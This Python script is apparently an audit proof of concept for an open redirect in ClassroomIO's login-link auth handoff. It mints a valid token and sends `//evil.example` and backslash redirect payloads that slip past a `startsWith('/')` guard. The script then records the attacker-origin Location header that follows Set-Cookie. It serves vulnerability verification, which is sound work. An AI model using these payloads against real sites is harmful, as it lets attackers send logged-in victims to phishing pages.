#!/usr/bin/env python3
"""
VULN-025 (F-15 + F-21) — Open redirect in login/signup AND in the server-side
auth-handoff via a protocol-relative `//evil.com` target.

Vulnerable code (targets/classroomio/):
  * server sink (decisive): packages/db/src/auth/plugins/login-link.ts:49,114-116
        redirectUrl = redirect && redirect.startsWith('/') ? redirect : '/';
        ... await setSessionCookie(...); return c.redirect(redirectUrl);
    identical shape in packages/db/src/auth/plugins/token-exchange.ts:41,124.
  * client sinks: apps/dashboard/src/routes/(auth)/login/+page.svelte:109-110
                  apps/dashboard/src/routes/(auth)/signup/+page.svelte:193-194
        window.location.href = redirect.startsWith('/') ? redirect : `/?redirect=...`;
  * query schema (no sanitization): packages/utils/src/validation/organization/login-link.ts:5
        redirect: z.string().optional()
  * correct-but-unused guard: apps/dashboard/src/lib/features/org/utils/org-join-redirect.ts:3-13

Class: CWE-601 open redirect.

The flaw: every redirect guard uses only `redirect.startsWith('/')`. A protocol-
relative URL `//evil.com` (and the backslash form `/\\evil.com`) starts with '/', so
it passes the check, yet a browser resolves it to a *different origin*. On the server
login-link handoff the redirect is emitted AFTER Set-Cookie, so a freshly-authenticated
victim is bounced to the attacker origin carrying a live session context.

Exploitation idea: mint a valid login-link token, then request
GET /api/auth/login-link?token=<valid>&redirect=//evil.example and observe the server
emit `Location: //evil.example` (a cross-origin protocol-relative target) — a raw HTTP
3xx, confirmable without a browser.

Success proves: the server issues a 3xx to an attacker-controlled cross-origin host
from a user-supplied `redirect` param, i.e. a working open redirect (and, because it
follows Set-Cookie, an authenticated-victim bounce).
"""
import os
import sys
import requests

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import signup, log, banner, verdict, rid, API, BASE_URL  # noqa: E402

VULN = "VULN-025"
HERE = os.path.dirname(os.path.abspath(__file__))
EVIL = os.environ.get("EVIL_HOST", "evil.example")


def mint_login_link_token() -> str:
    """A valid login-link token for a fresh account (self-mint 'view as student')."""
    u = signup(label=f"redir_{rid()}")
    r = u.post("/account/view-as-student-token", json={})
    if r.status_code != 200:
        raise RuntimeError(f"token mint failed: {r.status_code} {r.text[:200]}")
    return r.json()["data"]["token"]


def probe(token: str, redirect: str) -> requests.Response:
    """Cross-site top-level GET: no Origin header (like a real navigation)."""
    return requests.get(
        f"{API}/api/auth/login-link",
        params={"token": token, "redirect": redirect},
        allow_redirects=False,
        timeout=30,
    )


def main():
    banner(VULN, "Open redirect via startsWith('/') accepting protocol-relative //evil")
    log("SETUP", "minting a valid login-link token (self 'view as student' handoff)")
    token = mint_login_link_token()
    log("INFO", f"  token minted (len={len(token)})")

    cases = [
        (f"//{EVIL}/phish", "protocol-relative → cross-origin"),
        (f"/\\{EVIL}/phish", "backslash form (browsers treat /\\ as //)"),
        ("/lms", "safe same-origin control (should be accepted verbatim)"),
        (f"https://{EVIL}/x", "absolute URL control (rejected → falls back to /)"),
    ]

    results = {}
    for redirect, desc in cases:
        r = probe(token, redirect)
        loc = r.headers.get("location")
        results[redirect] = (r.status_code, loc)
        log("STEP", f"GET /api/auth/login-link?redirect={redirect!r} → HTTP {r.status_code}  Location={loc!r}  ({desc})")

    # Decisive: the // and /\ payloads must be reflected into Location unchanged
    # (i.e. the server bounces to the attacker origin), while https:// is rejected.
    loc_proto_rel = results[f"//{EVIL}/phish"][1] or ""
    loc_backslash = results[f"/\\{EVIL}/phish"][1] or ""
    loc_abs = results[f"https://{EVIL}/x"][1] or ""

    open_redirect = loc_proto_rel.startswith(f"//{EVIL}")
    backslash_open = loc_backslash.startswith(f"/\\{EVIL}") or loc_backslash.startswith(f"//{EVIL}")
    abs_rejected = loc_abs in ("/", "") or not loc_abs.startswith("http")

    # Confirm a session cookie is set on the same response (the "post-Set-Cookie bounce").
    r_decisive = probe(token, f"//{EVIL}/phish")
    set_cookie = r_decisive.headers.get("set-cookie", "")
    cookie_set = "classroomio" in set_cookie.lower()

    with open(os.path.join(HERE, "request.http"), "w") as f:
        f.write(
            f"### VULN-025 — server auth-handoff open redirect (raw HTTP 3xx, no browser needed)\n"
            f"GET {API}/api/auth/login-link?token=<VALID>&redirect=//{EVIL}/phish HTTP/1.1\n"
            f"Host: localhost:21527\n(no Origin — simulates a cross-site top-level navigation)\n\n"
            f"### client sinks accept the same payload:\n"
            f"GET {BASE_URL}/login?redirect=//{EVIL}/phish\n"
            f"GET {BASE_URL}/signup?redirect=//{EVIL}/phish\n"
        )
    with open(os.path.join(HERE, "response.txt"), "w") as f:
        f.write(f"GET /api/auth/login-link?...&redirect=//{EVIL}/phish\n")
        f.write(f"HTTP {r_decisive.status_code}\n")
        for k, v in r_decisive.headers.items():
            f.write(f"{k}: {v}\n")
        f.write("\n--- guard behaviour across payloads ---\n")
        for redirect, (code, loc) in results.items():
            f.write(f"redirect={redirect!r:24} → {code}  Location={loc!r}\n")

    if open_redirect:
        log("PROOF", f"server emitted Location: {loc_proto_rel!r} — an attacker-controlled "
                     f"CROSS-ORIGIN redirect from a user-supplied param (open redirect)")
    if cookie_set:
        log("PROOF", "the 3xx follows Set-Cookie: classroomio.session_token → an *authenticated* "
                     "victim is bounced to the attacker origin (auth-handoff variant)")
    if abs_rejected:
        log("INFO", f"control: absolute https://{EVIL} correctly falls back to Location={loc_abs!r} "
                    f"→ confirms only the // / /\\ bypass slips through startsWith('/')")

    if open_redirect and abs_rejected:
        extra = " + backslash variant" if backslash_open else ""
        verdict(VULN, "CONFIRMED",
                f"login-link auth-handoff open-redirects to //{EVIL}{extra}; post-Set-Cookie bounce")
        log("OK", "confirmed open redirect (server auth-handoff); client login/signup sinks share the flaw")
        sys.exit(0)

    verdict(VULN, "FAILED",
            f"open_redirect={open_redirect} abs_rejected={abs_rejected} loc={loc_proto_rel!r}")
    sys.exit(1)


if __name__ == "__main__":
    main()
